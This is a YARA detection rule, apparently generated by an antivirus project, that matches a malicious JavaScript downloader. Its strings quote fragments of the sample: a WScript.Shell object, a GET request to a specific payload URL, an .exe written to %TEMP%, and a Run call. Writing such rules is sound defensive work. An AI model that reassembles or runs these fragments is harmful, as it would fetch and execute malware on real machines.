rule sig_20160328_415420eadf1195e581bdc6303beb0283 {
  meta:
    description = "datamaliciousorder - file 20160328_415420eadf1195e581bdc6303beb0283.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "b0cf6d1e978a277fc2571d94c8aaa50062bee3304d7a63a65973dcbac231e0aa"

  strings:
    $s1  = "function Cwtaryo() {return Qqnxln[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"WiQiy5VR6nn.exe\";};" fullword ascii
    $s2  = "do {WScript[Lolis](Xchaoyd() * 11)} while (Rddxpputg[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Sfvxqhqv(Rtkieyy, Azgmspbumq){return Rtkieyy - Azgmspbumq;};" fullword ascii
    $s4  = "var Qqnxln = function Gnqlqyzp() {return WScript[Lzroptiiv](\"WScript.Shell\");}();" fullword ascii
    $s5  = "Rddxpputg[Alkpf](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s6  = "function Qyxuorgei() {return ((Vrapsuasn == true) && (Vrapsuasn == Hnxixos)) ? 1 : Sndgml;};" fullword ascii
    $s7  = "function Fdhabrl(Yharfxjgcn){Qqnxln[\"Run\"](Yharfxjgcn, Sndgml, Sndgml);};" fullword ascii
    $s8  = "function Qrimm(){return Lzroptiiv;};" fullword ascii
    $s9  = " while (Kyibmtkck){" fullword ascii
    $s10 = "Hnxixos = true; " fullword ascii
    $s11 = "return Sfvxqhqv(Jskoh, Btcwjan);" fullword ascii
    $s12 = "Vrapsuasn = true; " fullword ascii
    $s13 = "var Bbqag = new this[\"Date\"]();" fullword ascii
    $s14 = "var Nhyce = false;" fullword ascii
    $s15 = "var Vrapsuasn = false;" fullword ascii
    $s16 = "function Xchaoyd(){return 22;};" fullword ascii
    $s17 = "function Iopfcbyc(Npdsdg) {var Dltxbqve = (1, 2, 3, 4, 5, Npdsdg); return Dltxbqve;};" fullword ascii
    $s18 = "function Udbsbowcmc()" fullword ascii
    $s19 = "function Motygfucun(){return Acohrp;};" fullword ascii
    $s20 = "var Hnxixos = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}